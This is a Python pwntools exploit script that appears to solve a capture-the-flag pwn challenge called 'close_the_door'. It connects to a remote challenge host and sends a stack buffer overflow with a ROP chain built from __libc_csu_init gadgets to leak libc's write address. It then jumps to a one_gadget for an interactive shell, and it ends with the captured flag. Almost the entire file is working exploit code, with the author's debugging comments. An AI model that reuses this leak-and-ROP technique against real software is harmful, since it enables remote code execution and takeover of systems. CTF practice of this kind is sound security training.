from pwn import *

#target = process('./close_the_door', env={"LD_PRELOAD":"./libc.so.6"})
target = remote('138.68.182.108', 32576)
#244, 164
#pid = gdb.attach(target, "\nb *hidden_func+164\n set disassembly-flavor intel\ncontinue")



elf = ELF("close_the_door")
libc = ELF("libc.so.6")
#Gadgets:

#onegadget_offset = 0x4f3d5
onegadget_offset = 0x4f432
pop_rdi = p64(0x0000000000400b53) # : pop rdi ; ret
write_plt = p64(0x00400660)
csu_pops = p64(0x00400b4a)
csu_movs = p64(0x00400b30)
init = p64(0x601dc0)
write_got_plt = p64(0x601fb0)
hidden_func = p64(0x00400814)
main = p64(0x00400909)
check = p64(0x00602050)
read_plt = p64(0x004006a0)
pop_rsi = p64(0x0000000000400b51) # : pop rsi ; pop r15 ; ret
empty = p64(0x602280)

print(target.recvuntil(b'Any ideas where to search'))

payload = b'1' * 0xf

target.sendline(payload)

print(target.recvuntil(b'Give up'))

target.sendline(b'42')

print(target.recvuntil(b'Do you think this is the secret password?'))

padding = b'a' * 72
payload = padding
#payload = cyclic(600)

payload += csu_pops
payload += p64(0) #rbx
payload += p64(1) # rbp
payload += init #r12 gets
payload += p64(1) #r13 goes to edi
payload += write_got_plt #r14, goes to rsi
payload += p64(0x8) # r15, goes to rdx

payload += csu_movs
payload += b'a' * 8 #for the rsp+8
payload += b'a' * 8 * 6 #for the pops


payload += write_plt


#check has to be set to 0 or it won't work.

payload += csu_pops
payload += p64(0) #rbx
payload += p64(1) # rbp
payload += init #r12 gets called
payload += p64(0) #r13 goes to edi
payload += check #r14, goes to rsi
payload += p64(0x8) # r15, goes to rdx

payload += csu_movs
payload += b'a' * 8 #for the rsp+8
payload += b'a' * 8 * 6 #for the pops
payload += read_plt


#Adding this fixes things locally, but not against the server

payload += pop_rsi
payload += empty
payload += p64(0)
payload += read_plt

#And call hidden_function again
payload += pop_rdi
payload += p64(1)

payload += hidden_func

#payload += main

target.sendline(payload)
print('payload sent')
payload2 = b'\x00' * 8 + b'\x00'
target.sendline(payload2)
#The timeout saved the exploit. Thanks Cameron.
result = target.recvuntil(b'Do you', timeout=1)
print('result obtained', result)
#print(target.recvuntil(b'Any ideas where to search'))
#result = target.recvuntil(b'Any')

write_libc = result.replace(b'Do you', b'').replace(b'\n>', b'')
#write_libc = result.replace(b'Any', b'').replace(b'\n>', b'')
print(len(write_libc[1:9]))
write_libc_num = u64(write_libc[1:9])
print(hex(write_libc_num))

libc_base = write_libc_num - libc.symbols['write']
onegadget = libc_base + onegadget_offset
strlen_libc = libc_base + libc.symbols["strlen"]
print(hex(strlen_libc))

print(target.recvuntil(b' think this is the secret password?'))


payload = padding
#Something is wrong with my onegadget now >:(
payload += p64(onegadget) + b'\x00' * 0x50
#payload = cyclic(300)
target.sendline(payload)

#print(target.recvall())

target.interactive()

#CHTB{f_cl0s3d_d00r5_w1ll_n0t_st0p_us}
